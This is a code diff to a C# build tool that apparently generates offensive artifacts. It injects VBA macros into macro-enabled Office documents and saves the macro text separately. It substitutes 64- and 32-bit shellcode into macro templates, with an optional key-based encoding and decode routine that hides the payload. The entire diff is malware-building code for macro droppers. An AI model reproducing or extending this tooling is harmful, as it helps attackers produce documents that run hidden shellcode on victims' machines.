@@ -226,6 +226,8 @@ namespace Build
             //Prep dir structure
             try { Directory.Delete($"{solution_dir}\\ARTIFACTS", true); } catch {  }
             Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS");
+            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\docm");
+            //Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\docm\\vba");
 
             foreach (ArtifactType at in Enum.GetValues(typeof(ArtifactType)))
             {
@@ -461,6 +463,7 @@ namespace Build
             {
                 Directory.Delete(outputDir, true);
                 Directory.CreateDirectory(outputDir);
+                Directory.CreateDirectory(outputDir + "vba");
             }
 
 
@@ -482,6 +485,9 @@ namespace Build
 
                 //Remove template palceholders
                 string macroText = DeTemplate(File.ReadAllText(file),fi, args);
+
+                //File.Create(outputDir + @"vba\" + fi.Name);
+                File.WriteAllText(outputDir + @"vba\" + fi.Name, macroText);
 
                 //Inject the macro and save to output file.
                 InjectMacro(file, outFile, macroText);
@@ -622,8 +628,22 @@ namespace Build
                 }
                 else if (fi.Extension == ".vba")
                 {
+                    string dcf = $"{args[0]}\\Templates\\tmp_vba_decode_func.txt";
                     output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE64, ByteCodeLang.vba));
                     output = output.Replace("{SHELLCODE86}", ConvertByteCode(CONFIG.SHELLCODE86, ByteCodeLang.vba));
+
+                    if (CONFIG.ENCODED)
+                    {
+                        output = output.Replace("{DECODE_VBA_FUNC}", File.ReadAllText(dcf));
+                        output = output.Replace("{DECODE}", $"buf = Decode({CONFIG.SHELLCODE_NAME}, {$"&H{CONFIG.KEY:X2}"})");
+                    } else
+                    {
+                        output = output.Replace("{DECODE_VBA_FUNC}", "");
+                        output = output.Replace("{DECODE_VBA_VAR}", "");
+                        output = output.Replace("{DECODE}", "");
+                    }
+                    
+
                 }
                 else if (fi.Extension == ".py")
                 {
